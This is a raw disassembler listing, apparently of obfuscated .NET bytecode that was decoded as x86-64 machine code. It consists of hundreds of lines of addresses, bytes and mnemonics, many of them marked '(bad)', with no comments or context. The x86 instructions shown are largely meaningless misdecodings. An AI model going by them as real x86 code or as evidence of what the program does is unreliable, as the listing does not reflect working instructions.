  405710:	38 67 dd             	cmp    %ah,-0x23(%rdi)
  405713:	ff                   	(bad)
  405714:	ff                   	(bad)
  405715:	fe 0c 27             	decb   (%rdi,%riz,1)
  405718:	00 20                	add    %ah,(%rax)
  40571a:	0c 00                	or     $0x0,%al
  40571c:	00 00                	add    %al,(%rax)
  40571e:	20 58 00             	and    %bl,0x0(%rax)
  405721:	00 00                	add    %al,(%rax)
  405723:	20 44 00 00          	and    %al,0x0(%rax,%rax,1)
  405727:	00 58 9c             	add    %bl,-0x64(%rax)
  40572a:	20 d5                	and    %dl,%ch
  40572c:	00 00                	add    %al,(%rax)
  40572e:	00 38                	add    %bh,(%rax)
  405730:	50                   	push   %rax
  405731:	dd ff                	(bad)
  405733:	ff                   	(bad)
  405734:	fe 0c 27             	decb   (%rdi,%riz,1)
  405737:	00 20                	add    %ah,(%rax)
  405739:	04 00                	add    $0x0,%al
  40573b:	00 00                	add    %al,(%rax)
  40573d:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  405740:	00 9c 20 3d 00 00 00 	add    %bl,0x3d(%rax,%riz,1)
  405747:	38 38                	cmp    %bh,(%rax)
  405749:	dd ff                	(bad)
  40574b:	ff                   	(bad)
  40574c:	fe 0c 27             	decb   (%rdi,%riz,1)
  40574f:	00 20                	add    %ah,(%rax)
  405751:	0a 00                	or     (%rax),%al
  405753:	00 00                	add    %al,(%rax)
  405755:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  405758:	00 9c 20 7b 00 00 00 	add    %bl,0x7b(%rax,%riz,1)
  40575f:	fe 0e                	decb   (%rsi)
  405761:	33 00                	xor    (%rax),%eax
  405763:	38 18                	cmp    %bl,(%rax)
  405765:	dd ff                	(bad)
  405767:	ff 11                	call   *(%rcx)
  405769:	10 17                	adc    %dl,(%rdi)
  40576b:	58                   	pop    %rax
  40576c:	13 10                	adc    (%rax),%edx
  40576e:	20 4b 00             	and    %cl,0x0(%rbx)
  405771:	00 00                	add    %al,(%rax)
  405773:	fe 0e                	decb   (%rsi)
  405775:	33 00                	xor    (%rax),%eax
  405777:	38 04 dd ff ff fe 0c 	cmp    %al,0xcfeffff(,%rbx,8)
  40577e:	27                   	(bad)
  40577f:	00 20                	add    %ah,(%rax)
  405781:	04 00                	add    $0x0,%al
  405783:	00 00                	add    %al,(%rax)
  405785:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  405788:	00 9c 20 2f 01 00 00 	add    %bl,0x12f(%rax,%riz,1)
  40578f:	38 e8                	cmp    %ch,%al
  405791:	dc ff                	fdivr  %st,%st(7)
  405793:	ff                   	(bad)
  405794:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405797:	00 20                	add    %ah,(%rax)
  405799:	00 00                	add    %al,(%rax)
  40579b:	00 00                	add    %al,(%rax)
  40579d:	20 51 00             	and    %dl,0x0(%rcx)
  4057a0:	00 00                	add    %al,(%rax)
  4057a2:	20 16                	and    %dl,(%rsi)
  4057a4:	00 00                	add    %al,(%rax)
  4057a6:	00 58 9c             	add    %bl,-0x64(%rax)
  4057a9:	20 79 01             	and    %bh,0x1(%rcx)
  4057ac:	00 00                	add    %al,(%rax)
  4057ae:	38 d1                	cmp    %dl,%cl
  4057b0:	dc ff                	fdivr  %st,%st(7)
  4057b2:	ff 20                	jmp    *(%rax)
  4057b4:	51                   	push   %rcx
  4057b5:	00 00                	add    %al,(%rax)
  4057b7:	00 20                	add    %ah,(%rax)
  4057b9:	16                   	(bad)
  4057ba:	00 00                	add    %al,(%rax)
  4057bc:	00 58 fe             	add    %bl,-0x2(%rax)
  4057bf:	0e                   	(bad)
  4057c0:	2b 00                	sub    (%rax),%eax
  4057c2:	20 0b                	and    %cl,(%rbx)
  4057c4:	00 00                	add    %al,(%rax)
  4057c6:	00 38                	add    %bh,(%rax)
  4057c8:	b0 dc                	mov    $0xdc,%al
  4057ca:	ff                   	(bad)
  4057cb:	ff 20                	jmp    *(%rax)
  4057cd:	46 00 00             	rex.RX add %r8b,(%rax)
  4057d0:	00 20                	add    %ah,(%rax)
  4057d2:	3f                   	(bad)
  4057d3:	00 00                	add    %al,(%rax)
  4057d5:	00 58 fe             	add    %bl,-0x2(%rax)
  4057d8:	0e                   	(bad)
  4057d9:	1e                   	(bad)
  4057da:	00 20                	add    %ah,(%rax)
  4057dc:	27                   	(bad)
  4057dd:	00 00                	add    %al,(%rax)
  4057df:	00 fe                	add    %bh,%dh
  4057e1:	0e                   	(bad)
  4057e2:	33 00                	xor    (%rax),%eax
  4057e4:	38 97 dc ff ff fe    	cmp    %dl,-0x1000024(%rdi)
  4057ea:	0c 27                	or     $0x27,%al
  4057ec:	00 20                	add    %ah,(%rax)
  4057ee:	08 00                	or     %al,(%rax)
  4057f0:	00 00                	add    %al,(%rax)
  4057f2:	20 e0                	and    %ah,%al
  4057f4:	00 00                	add    %al,(%rax)
  4057f6:	00 20                	add    %ah,(%rax)
  4057f8:	4a 00 00             	rex.WX add %al,(%rax)
  4057fb:	00 59 9c             	add    %bl,-0x64(%rcx)
  4057fe:	20 bc 00 00 00 fe 0e 	and    %bh,0xefe0000(%rax,%rax,1)
  405805:	33 00                	xor    (%rax),%eax
  405807:	16                   	(bad)
  405808:	39 73 dc             	cmp    %esi,-0x24(%rbx)
  40580b:	ff                   	(bad)
  40580c:	ff 20                	jmp    *(%rax)
  40580e:	b5 00                	mov    $0x0,%ch
  405810:	00 00                	add    %al,(%rax)
  405812:	20 41 00             	and    %al,0x0(%rcx)
  405815:	00 00                	add    %al,(%rax)
  405817:	59                   	pop    %rcx
  405818:	fe 0e                	decb   (%rsi)
  40581a:	0c 00                	or     $0x0,%al
  40581c:	20 0f                	and    %cl,(%rdi)
  40581e:	00 00                	add    %al,(%rax)
  405820:	00 38                	add    %bh,(%rax)
  405822:	56                   	push   %rsi
  405823:	dc ff                	fdivr  %st,%st(7)
  405825:	ff                   	(bad)
  405826:	fe 0c 27             	decb   (%rdi,%riz,1)
  405829:	00 20                	add    %ah,(%rax)
  40582b:	06                   	(bad)
  40582c:	00 00                	add    %al,(%rax)
  40582e:	00 20                	add    %ah,(%rax)
  405830:	65 00 00             	add    %al,%gs:(%rax)
  405833:	00 20                	add    %ah,(%rax)
  405835:	22 00                	and    (%rax),%al
  405837:	00 00                	add    %al,(%rax)
  405839:	58                   	pop    %rax
  40583a:	9c                   	pushf
  40583b:	20 7d 00             	and    %bh,0x0(%rbp)
  40583e:	00 00                	add    %al,(%rax)
  405840:	38 3f                	cmp    %bh,(%rdi)
  405842:	dc ff                	fdivr  %st,%st(7)
  405844:	ff 20                	jmp    *(%rax)
  405846:	6a 00                	push   $0x0
  405848:	00 00                	add    %al,(%rax)
  40584a:	20 17                	and    %dl,(%rdi)
  40584c:	00 00                	add    %al,(%rax)
  40584e:	00 58 fe             	add    %bl,-0x2(%rax)
  405851:	0e                   	(bad)
  405852:	1e                   	(bad)
  405853:	00 20                	add    %ah,(%rax)
  405855:	96                   	xchg   %eax,%esi
  405856:	00 00                	add    %al,(%rax)
  405858:	00 38                	add    %bh,(%rax)
  40585a:	1e                   	(bad)
  40585b:	dc ff                	fdivr  %st,%st(7)
  40585d:	ff 20                	jmp    *(%rax)
  40585f:	23 00                	and    (%rax),%eax
  405861:	00 00                	add    %al,(%rax)
  405863:	20 21                	and    %ah,(%rcx)
  405865:	00 00                	add    %al,(%rax)
  405867:	00 58 fe             	add    %bl,-0x2(%rax)
  40586a:	0e                   	(bad)
  40586b:	2b 00                	sub    (%rax),%eax
  40586d:	20 a0 00 00 00 fe    	and    %ah,-0x2000000(%rax)
  405873:	0e                   	(bad)
  405874:	33 00                	xor    (%rax),%eax
  405876:	38 a6 12 00 00 3a    	cmp    %ah,0x3a000012(%rsi)
  40587c:	00 dc                	add    %bl,%ah
  40587e:	ff                   	(bad)
  40587f:	ff                   	(bad)
  405880:	fe 0c 27             	decb   (%rdi,%riz,1)
  405883:	00 20                	add    %ah,(%rax)
  405885:	1a 00                	sbb    (%rax),%al
  405887:	00 00                	add    %al,(%rax)
  405889:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  40588c:	00 9c 20 09 01 00 00 	add    %bl,0x109(%rax,%riz,1)
  405893:	fe 0e                	decb   (%rsi)
  405895:	33 00                	xor    (%rax),%eax
  405897:	17                   	(bad)
  405898:	3a e3                	cmp    %bl,%ah
  40589a:	db ff                	(bad)
  40589c:	ff                   	(bad)
  40589d:	fe 0c 27             	decb   (%rdi,%riz,1)
  4058a0:	00 20                	add    %ah,(%rax)
  4058a2:	07                   	(bad)
  4058a3:	00 00                	add    %al,(%rax)
  4058a5:	00 fe                	add    %bh,%dh
  4058a7:	0c 2b                	or     $0x2b,%al
  4058a9:	00 9c 20 e8 00 00 00 	add    %bl,0xe8(%rax,%riz,1)
  4058b0:	38 cf                	cmp    %cl,%bh
  4058b2:	db ff                	(bad)
  4058b4:	ff 20                	jmp    *(%rax)
  4058b6:	26 00 00             	es add %al,(%rax)
  4058b9:	00 20                	add    %ah,(%rax)
  4058bb:	05 00 00 00 58       	add    $0x58000000,%eax
  4058c0:	fe 0e                	decb   (%rsi)
  4058c2:	1e                   	(bad)
  4058c3:	00 20                	add    %ah,(%rax)
  4058c5:	0a 01                	or     (%rcx),%al
  4058c7:	00 00                	add    %al,(%rax)
  4058c9:	fe 0e                	decb   (%rsi)
  4058cb:	33 00                	xor    (%rax),%eax
  4058cd:	16                   	(bad)
  4058ce:	39 ad db ff ff 16    	cmp    %ebp,0x16ffffdb(%rbp)
  4058d4:	13 10                	adc    (%rax),%edx
  4058d6:	20 12                	and    %dl,(%rdx)
  4058d8:	00 00                	add    %al,(%rax)
  4058da:	00 fe                	add    %bh,%dh
  4058dc:	0e                   	(bad)
  4058dd:	33 00                	xor    (%rax),%eax
  4058df:	38 9c db ff ff 11 02 	cmp    %bl,0x211ffff(%rbx,%rbx,8)
  4058e6:	1e                   	(bad)
  4058e7:	62 13 02 20 2e       	(bad)
  4058ec:	00 00                	add    %al,(%rax)
  4058ee:	00 38                	add    %bh,(%rax)
  4058f0:	88 db                	mov    %bl,%bl
  4058f2:	ff                   	(bad)
  4058f3:	ff 20                	jmp    *(%rax)
  4058f5:	06                   	(bad)
  4058f6:	00 00                	add    %al,(%rax)
  4058f8:	00 20                	add    %ah,(%rax)
  4058fa:	2a 00                	sub    (%rax),%al
  4058fc:	00 00                	add    %al,(%rax)
  4058fe:	58                   	pop    %rax
  4058ff:	fe 0e                	decb   (%rsi)
  405901:	1e                   	(bad)
  405902:	00 20                	add    %ah,(%rax)
  405904:	57                   	push   %rdi
  405905:	01 00                	add    %eax,(%rax)
  405907:	00 38                	add    %bh,(%rax)
  405909:	77 db                	ja     0x4058e6
  40590b:	ff                   	(bad)
  40590c:	ff                   	(bad)
  40590d:	fe 0c 27             	decb   (%rdi,%riz,1)
  405910:	00 20                	add    %ah,(%rax)
  405912:	05 00 00 00 fe       	add    $0xfe000000,%eax
  405917:	0c 2b                	or     $0x2b,%al
  405919:	00 9c 20 04 00 00 00 	add    %bl,0x4(%rax,%riz,1)
  405920:	fe 0e                	decb   (%rsi)
  405922:	33 00                	xor    (%rax),%eax
  405924:	38 02                	cmp    %al,(%rdx)
  405926:	12 00                	adc    (%rax),%al
  405928:	00 3a                	add    %bh,(%rdx)
  40592a:	52                   	push   %rdx
  40592b:	db ff                	(bad)
  40592d:	ff                   	(bad)
  40592e:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405931:	00 20                	add    %ah,(%rax)
  405933:	06                   	(bad)
  405934:	00 00                	add    %al,(%rax)
  405936:	00 fe                	add    %bh,%dh
  405938:	0c 0b                	or     $0xb,%al
  40593a:	00 9c 20 68 01 00 00 	add    %bl,0x168(%rax,%riz,1)
  405941:	fe 0e                	decb   (%rsi)
  405943:	33 00                	xor    (%rax),%eax
  405945:	38 36                	cmp    %dh,(%rsi)
  405947:	db ff                	(bad)
  405949:	ff                   	(bad)
  40594a:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40594d:	00 20                	add    %ah,(%rax)
  40594f:	00 00                	add    %al,(%rax)
  405951:	00 00                	add    %al,(%rax)
  405953:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  405956:	00 9c 20 43 01 00 00 	add    %bl,0x143(%rax,%riz,1)
  40595d:	fe 0e                	decb   (%rsi)
  40595f:	33 00                	xor    (%rax),%eax
  405961:	38 1a                	cmp    %bl,(%rdx)
  405963:	db ff                	(bad)
  405965:	ff                   	(bad)
  405966:	fe 0c 27             	decb   (%rdi,%riz,1)
  405969:	00 20                	add    %ah,(%rax)
  40596b:	1c 00                	sbb    $0x0,%al
  40596d:	00 00                	add    %al,(%rax)
  40596f:	20 7b 00             	and    %bh,0x0(%rbx)
  405972:	00 00                	add    %al,(%rax)
  405974:	20 02                	and    %al,(%rdx)
  405976:	00 00                	add    %al,(%rax)
  405978:	00 58 9c             	add    %bl,-0x64(%rax)
  40597b:	20 7e 01             	and    %bh,0x1(%rsi)
  40597e:	00 00                	add    %al,(%rax)
  405980:	fe 0e                	decb   (%rsi)
  405982:	33 00                	xor    (%rax),%eax
  405984:	38 f7                	cmp    %dh,%bh
  405986:	da ff                	(bad)
  405988:	ff 20                	jmp    *(%rax)
  40598a:	d2 00                	rolb   %cl,(%rax)
  40598c:	00 00                	add    %al,(%rax)
  40598e:	20 46 00             	and    %al,0x0(%rsi)
  405991:	00 00                	add    %al,(%rax)
  405993:	59                   	pop    %rcx
  405994:	fe 0e                	decb   (%rsi)
  405996:	0b 00                	or     (%rax),%eax
  405998:	20 56 01             	and    %dl,0x1(%rsi)
  40599b:	00 00                	add    %al,(%rax)
  40599d:	38 e2                	cmp    %ah,%dl
  40599f:	da ff                	(bad)
  4059a1:	ff                   	(bad)
  4059a2:	fe 0c 27             	decb   (%rdi,%riz,1)
  4059a5:	00 20                	add    %ah,(%rax)
  4059a7:	08 00                	or     %al,(%rax)
  4059a9:	00 00                	add    %al,(%rax)
  4059ab:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  4059ae:	00 9c 20 a8 00 00 00 	add    %bl,0xa8(%rax,%riz,1)
  4059b5:	38 c2                	cmp    %al,%dl
  4059b7:	da ff                	(bad)
  4059b9:	ff                   	(bad)
  4059ba:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  4059bd:	00 20                	add    %ah,(%rax)
  4059bf:	01 00                	add    %eax,(%rax)
  4059c1:	00 00                	add    %al,(%rax)
  4059c3:	20 99 00 00 00 20    	and    %bl,0x20000000(%rcx)
  4059c9:	33 00                	xor    (%rax),%eax
  4059cb:	00 00                	add    %al,(%rax)
  4059cd:	59                   	pop    %rcx
  4059ce:	9c                   	pushf
  4059cf:	20 29                	and    %ch,(%rcx)
  4059d1:	01 00                	add    %eax,(%rax)
  4059d3:	00 fe                	add    %bh,%dh
  4059d5:	0e                   	(bad)
  4059d6:	33 00                	xor    (%rax),%eax
  4059d8:	17                   	(bad)
  4059d9:	3a a2 da ff ff 20    	cmp    0x20ffffda(%rdx),%ah
  4059df:	ec                   	in     (%dx),%al
  4059e0:	00 00                	add    %al,(%rax)
  4059e2:	00 20                	add    %ah,(%rax)
  4059e4:	4e 00 00             	rex.WRX add %r8b,(%rax)
  4059e7:	00 59 fe             	add    %bl,-0x2(%rcx)
  4059ea:	0e                   	(bad)
  4059eb:	1e                   	(bad)
  4059ec:	00 20                	add    %ah,(%rax)
  4059ee:	1c 00                	sbb    $0x0,%al
  4059f0:	00 00                	add    %al,(%rax)
  4059f2:	38 85 da ff ff fe    	cmp    %al,-0x1000026(%rbp)
  4059f8:	0c 27                	or     $0x27,%al
  4059fa:	00 20                	add    %ah,(%rax)
  4059fc:	12 00                	adc    (%rax),%al
  4059fe:	00 00                	add    %al,(%rax)
  405a00:	20 d3                	and    %dl,%bl
  405a02:	00 00                	add    %al,(%rax)
  405a04:	00 20                	add    %ah,(%rax)
  405a06:	46 00 00             	rex.RX add %r8b,(%rax)
  405a09:	00 59 9c             	add    %bl,-0x64(%rcx)
  405a0c:	20 8b 01 00 00 fe    	and    %cl,-0x1ffffff(%rbx)
  405a12:	0e                   	(bad)
  405a13:	33 00                	xor    (%rax),%eax
  405a15:	38 1b                	cmp    %bl,(%rbx)
  405a17:	11 00                	adc    %eax,(%rax)
  405a19:	00 39                	add    %bh,(%rcx)
  405a1b:	61                   	(bad)
  405a1c:	da ff                	(bad)
  405a1e:	ff                   	(bad)
  405a1f:	fe 0c 27             	decb   (%rdi,%riz,1)
  405a22:	00 20                	add    %ah,(%rax)
  405a24:	18 00                	sbb    %al,(%rax)
  405a26:	00 00                	add    %al,(%rax)
  405a28:	20 47 00             	and    %al,0x0(%rdi)
  405a2b:	00 00                	add    %al,(%rax)
  405a2d:	20 6f 00             	and    %ch,0x0(%rdi)
  405a30:	00 00                	add    %al,(%rax)
  405a32:	58                   	pop    %rax
  405a33:	9c                   	pushf
  405a34:	20 11                	and    %dl,(%rcx)
  405a36:	00 00                	add    %al,(%rax)
  405a38:	00 38                	add    %bh,(%rax)
  405a3a:	3e da ff             	ds (bad)
  405a3d:	ff                   	(bad)
  405a3e:	fe 0c 27             	decb   (%rdi,%riz,1)
  405a41:	00 20                	add    %ah,(%rax)
  405a43:	1e                   	(bad)
  405a44:	00 00                	add    %al,(%rax)
  405a46:	00 fe                	add    %bh,%dh
  405a48:	0c 2b                	or     $0x2b,%al
  405a4a:	00 9c 20 49 01 00 00 	add    %bl,0x149(%rax,%riz,1)
  405a51:	38 2e                	cmp    %ch,(%rsi)
  405a53:	da ff                	(bad)
  405a55:	ff                   	(bad)
  405a56:	fe 0c 27             	decb   (%rdi,%riz,1)
  405a59:	00 20                	add    %ah,(%rax)
  405a5b:	13 00                	adc    (%rax),%eax
  405a5d:	00 00                	add    %al,(%rax)
  405a5f:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  405a62:	00 9c 20 e1 00 00 00 	add    %bl,0xe1(%rax,%riz,1)
  405a69:	38 0e                	cmp    %cl,(%rsi)
  405a6b:	da ff                	(bad)
  405a6d:	ff                   	(bad)
  405a6e:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405a71:	00 20                	add    %ah,(%rax)
  405a73:	07                   	(bad)
  405a74:	00 00                	add    %al,(%rax)
  405a76:	00 20                	add    %ah,(%rax)
  405a78:	e8 00 00 00 20       	call   0x20405a7d
  405a7d:	4d 00 00             	rex.WRB add %r8b,(%r8)
  405a80:	00 59 9c             	add    %bl,-0x64(%rcx)
  405a83:	20 95 01 00 00 38    	and    %dl,0x38000001(%rbp)
  405a89:	f7 d9                	neg    %ecx
  405a8b:	ff                   	(bad)
  405a8c:	ff                   	(bad)
  405a8d:	fe 0c 27             	decb   (%rdi,%riz,1)
  405a90:	00 20                	add    %ah,(%rax)
  405a92:	1d 00 00 00 20       	sbb    $0x20000000,%eax
  405a97:	66 00 00             	data16 add %al,(%rax)
  405a9a:	00 20                	add    %ah,(%rax)
  405a9c:	4b 00 00             	rex.WXB add %al,(%r8)
  405a9f:	00 58 9c             	add    %bl,-0x64(%rax)
  405aa2:	20 27                	and    %ah,(%rdi)
  405aa4:	01 00                	add    %eax,(%rax)
  405aa6:	00 38                	add    %bh,(%rax)
  405aa8:	d8 d9                	fcomp  %st(1)
  405aaa:	ff                   	(bad)
  405aab:	ff 11                	call   *(%rcx)
  405aad:	07                   	(bad)
  405aae:	11 24 16             	adc    %esp,(%rsi,%rdx,1)
  405ab1:	11 24 8e             	adc    %esp,(%rsi,%rcx,4)
  405ab4:	69 38 85 10 00 00    	imul   $0x1085,(%rax),%edi
  405aba:	20 38                	and    %bh,(%rax)
  405abc:	00 00                	add    %al,(%rax)
  405abe:	00 38                	add    %bh,(%rax)
  405ac0:	b8 d9 ff ff fe       	mov    $0xfeffffd9,%eax
  405ac5:	0c 27                	or     $0x27,%al
  405ac7:	00 20                	add    %ah,(%rax)
  405ac9:	10 00                	adc    %al,(%rax)
  405acb:	00 00                	add    %al,(%rax)
  405acd:	20 8a 00 00 00 20    	and    %cl,0x20000000(%rdx)
  405ad3:	2e 00 00             	cs add %al,(%rax)
  405ad6:	00 59 9c             	add    %bl,-0x64(%rcx)
  405ad9:	20 55 01             	and    %dl,0x1(%rbp)
  405adc:	00 00                	add    %al,(%rax)
  405ade:	fe 0e                	decb   (%rsi)
  405ae0:	33 00                	xor    (%rax),%eax
  405ae2:	38 62 10             	cmp    %ah,0x10(%rdx)
  405ae5:	00 00                	add    %al,(%rax)
  405ae7:	3a 94 d9 ff ff 20 a8 	cmp    -0x57df0001(%rcx,%rbx,8),%dl
  405aee:	00 00                	add    %al,(%rax)
  405af0:	00 20                	add    %ah,(%rax)
  405af2:	38 00                	cmp    %al,(%rax)
  405af4:	00 00                	add    %al,(%rax)
  405af6:	59                   	pop    %rcx
  405af7:	fe 0e                	decb   (%rsi)
  405af9:	0c 00                	or     $0x0,%al
  405afb:	20 64 01 00          	and    %ah,0x0(%rcx,%rax,1)
  405aff:	00 38                	add    %bh,(%rax)
  405b01:	77 d9                	ja     0x405adc
  405b03:	ff                   	(bad)
  405b04:	ff                   	(bad)
  405b05:	fe 0c 27             	decb   (%rdi,%riz,1)
  405b08:	00 20                	add    %ah,(%rax)
  405b0a:	19 00                	sbb    %eax,(%rax)
  405b0c:	00 00                	add    %al,(%rax)
  405b0e:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  405b11:	00 9c 20 17 00 00 00 	add    %bl,0x17(%rax,%riz,1)
  405b18:	fe 0e                	decb   (%rsi)
  405b1a:	33 00                	xor    (%rax),%eax
  405b1c:	38 5f d9             	cmp    %bl,-0x27(%rdi)
  405b1f:	ff                   	(bad)
  405b20:	ff                   	(bad)
  405b21:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405b24:	00 20                	add    %ah,(%rax)
  405b26:	07                   	(bad)
  405b27:	00 00                	add    %al,(%rax)
  405b29:	00 fe                	add    %bh,%dh
  405b2b:	0c 1e                	or     $0x1e,%al
  405b2d:	00 9c 20 86 01 00 00 	add    %bl,0x186(%rax,%riz,1)
  405b34:	38 43 d9             	cmp    %al,-0x27(%rbx)
  405b37:	ff                   	(bad)
  405b38:	ff 11                	call   *(%rcx)
  405b3a:	25 17 11 19 16       	and    $0x16191117,%eax
  405b3f:	91                   	xchg   %eax,%ecx
  405b40:	9c                   	pushf
  405b41:	20 eb                	and    %ch,%bl
  405b43:	00 00                	add    %al,(%rax)
  405b45:	00 fe                	add    %bh,%dh
  405b47:	0e                   	(bad)
  405b48:	33 00                	xor    (%rax),%eax
  405b4a:	38 04 10             	cmp    %al,(%rax,%rdx,1)
  405b4d:	00 00                	add    %al,(%rax)
  405b4f:	39 2c d9             	cmp    %ebp,(%rcx,%rbx,8)
  405b52:	ff                   	(bad)
  405b53:	ff 11                	call   *(%rcx)
  405b55:	0a 13                	or     (%rbx),%dl
  405b57:	1a 20                	sbb    (%rax),%ah
  405b59:	48 00 00             	rex.W add %al,(%rax)
  405b5c:	00 38                	add    %bh,(%rax)
  405b5e:	1a d9                	sbb    %cl,%bl
  405b60:	ff                   	(bad)
  405b61:	ff 20                	jmp    *(%rax)
  405b63:	df 00                	filds  (%rax)
  405b65:	00 00                	add    %al,(%rax)
  405b67:	20 4a 00             	and    %cl,0x0(%rdx)
  405b6a:	00 00                	add    %al,(%rax)
  405b6c:	59                   	pop    %rcx
  405b6d:	fe 0e                	decb   (%rsi)
  405b6f:	0c 00                	or     $0x0,%al
  405b71:	20 74 01 00          	and    %dh,0x0(%rcx,%rax,1)
  405b75:	00 fe                	add    %bh,%dh
  405b77:	0e                   	(bad)
  405b78:	33 00                	xor    (%rax),%eax
  405b7a:	16                   	(bad)
  405b7b:	39 00                	cmp    %eax,(%rax)
  405b7d:	d9 ff                	fcos
  405b7f:	ff                   	(bad)
  405b80:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405b83:	00 20                	add    %ah,(%rax)
  405b85:	0a 00                	or     (%rax),%al
  405b87:	00 00                	add    %al,(%rax)
  405b89:	20 9e 00 00 00 20    	and    %bl,0x20000000(%rsi)
  405b8f:	17                   	(bad)
  405b90:	00 00                	add    %al,(%rax)
  405b92:	00 58 9c             	add    %bl,-0x64(%rax)
  405b95:	20 6c 01 00          	and    %ch,0x0(%rcx,%rax,1)
  405b99:	00 38                	add    %bh,(%rax)
  405b9b:	e5 d8                	in     $0xd8,%eax
  405b9d:	ff                   	(bad)
  405b9e:	ff 20                	jmp    *(%rax)
  405ba0:	72 00                	jb     0x405ba2
  405ba2:	00 00                	add    %al,(%rax)
  405ba4:	20 0e                	and    %cl,(%rsi)
  405ba6:	00 00                	add    %al,(%rax)
  405ba8:	00 58 fe             	add    %bl,-0x2(%rax)
  405bab:	0e                   	(bad)
  405bac:	0c 00                	or     $0x0,%al
  405bae:	20 f9                	and    %bh,%cl
  405bb0:	00 00                	add    %al,(%rax)
  405bb2:	00 38                	add    %bh,(%rax)
  405bb4:	cc                   	int3
  405bb5:	d8 ff                	fdivr  %st(7),%st
  405bb7:	ff 16                	call   *(%rsi)
  405bb9:	13 2c 38             	adc    (%rax,%rdi,1),%ebp
  405bbc:	c1 e4 ff             	shl    $0xff,%esp
  405bbf:	ff 26                	jmp    *(%rsi)
  405bc1:	20 20                	and    %ah,(%rax)
  405bc3:	01 00                	add    %eax,(%rax)
  405bc5:	00 38                	add    %bh,(%rax)
  405bc7:	b9 d8 ff ff fe       	mov    $0xfeffffd8,%ecx
  405bcc:	0c 27                	or     $0x27,%al
  405bce:	00 20                	add    %ah,(%rax)
  405bd0:	0d 00 00 00 20       	or     $0x20000000,%eax
  405bd5:	50                   	push   %rax
  405bd6:	00 00                	add    %al,(%rax)
  405bd8:	00 20                	add    %ah,(%rax)
  405bda:	5c                   	pop    %rsp
  405bdb:	00 00                	add    %al,(%rax)
  405bdd:	00 58 9c             	add    %bl,-0x64(%rax)
  405be0:	20 3e                	and    %bh,(%rsi)
  405be2:	00 00                	add    %al,(%rax)
  405be4:	00 fe                	add    %bh,%dh
  405be6:	0e                   	(bad)
  405be7:	33 00                	xor    (%rax),%eax
  405be9:	38 6f 0f             	cmp    %ch,0xf(%rdi)
  405bec:	00 00                	add    %al,(%rax)
  405bee:	39 47 ef             	cmp    %eax,-0x11(%rdi)
  405bf1:	ff                   	(bad)
  405bf2:	ff                   	(bad)
  405bf3:	38 88 d8 ff ff 20    	cmp    %cl,0x20ffffd8(%rax)
  405bf9:	98                   	cwtl
  405bfa:	00 00                	add    %al,(%rax)
  405bfc:	00 20                	add    %ah,(%rax)
  405bfe:	32 00                	xor    (%rax),%al
  405c00:	00 00                	add    %al,(%rax)
  405c02:	59                   	pop    %rcx
  405c03:	fe 0e                	decb   (%rsi)
  405c05:	1e                   	(bad)
  405c06:	00 20                	add    %ah,(%rax)
  405c08:	b5 00                	mov    $0x0,%ch
  405c0a:	00 00                	add    %al,(%rax)
  405c0c:	fe 0e                	decb   (%rsi)
  405c0e:	33 00                	xor    (%rax),%eax
  405c10:	16                   	(bad)
  405c11:	39 6a d8             	cmp    %ebp,-0x28(%rdx)
  405c14:	ff                   	(bad)
  405c15:	ff                   	(bad)
  405c16:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405c19:	00 20                	add    %ah,(%rax)
  405c1b:	0c 00                	or     $0x0,%al
  405c1d:	00 00                	add    %al,(%rax)
  405c1f:	20 f9                	and    %bh,%cl
  405c21:	00 00                	add    %al,(%rax)
  405c23:	00 20                	add    %ah,(%rax)
  405c25:	53                   	push   %rbx
  405c26:	00 00                	add    %al,(%rax)
  405c28:	00 59 9c             	add    %bl,-0x64(%rcx)
  405c2b:	20 52 00             	and    %dl,0x0(%rdx)
  405c2e:	00 00                	add    %al,(%rax)
  405c30:	38 47 d8             	cmp    %al,-0x28(%rdi)
  405c33:	ff                   	(bad)
  405c34:	ff                   	(bad)
  405c35:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405c38:	00 20                	add    %ah,(%rax)
  405c3a:	01 00                	add    %eax,(%rax)
  405c3c:	00 00                	add    %al,(%rax)
  405c3e:	20 82 00 00 00 20    	and    %al,0x20000000(%rdx)
  405c44:	2b 00                	sub    (%rax),%eax
  405c46:	00 00                	add    %al,(%rax)
  405c48:	59                   	pop    %rcx
  405c49:	9c                   	pushf
  405c4a:	20 33                	and    %dh,(%rbx)
  405c4c:	01 00                	add    %eax,(%rax)
  405c4e:	00 38                	add    %bh,(%rax)
  405c50:	30 d8                	xor    %bl,%al
  405c52:	ff                   	(bad)
  405c53:	ff 20                	jmp    *(%rax)
  405c55:	2e 00 00             	cs add %al,(%rax)
  405c58:	00 20                	add    %ah,(%rax)
  405c5a:	58                   	pop    %rax
  405c5b:	00 00                	add    %al,(%rax)
  405c5d:	00 58 fe             	add    %bl,-0x2(%rax)
  405c60:	0e                   	(bad)
  405c61:	2b 00                	sub    (%rax),%eax
  405c63:	20 06                	and    %al,(%rsi)
  405c65:	01 00                	add    %eax,(%rax)
  405c67:	00 fe                	add    %bh,%dh
  405c69:	0e                   	(bad)
  405c6a:	33 00                	xor    (%rax),%eax
  405c6c:	17                   	(bad)
  405c6d:	3a 0e                	cmp    (%rsi),%cl
  405c6f:	d8 ff                	fdivr  %st(7),%st
  405c71:	ff 11                	call   *(%rcx)
  405c73:	19 39                	sbb    %edi,(%rcx)
  405c75:	5a                   	pop    %rdx
  405c76:	fc                   	cld
  405c77:	ff                   	(bad)
  405c78:	ff 20                	jmp    *(%rax)
  405c7a:	03 01                	add    (%rcx),%eax
  405c7c:	00 00                	add    %al,(%rax)
  405c7e:	fe 0e                	decb   (%rsi)
  405c80:	33 00                	xor    (%rax),%eax
  405c82:	38 f9                	cmp    %bh,%cl
  405c84:	d7                   	xlat   (%rbx)
  405c85:	ff                   	(bad)
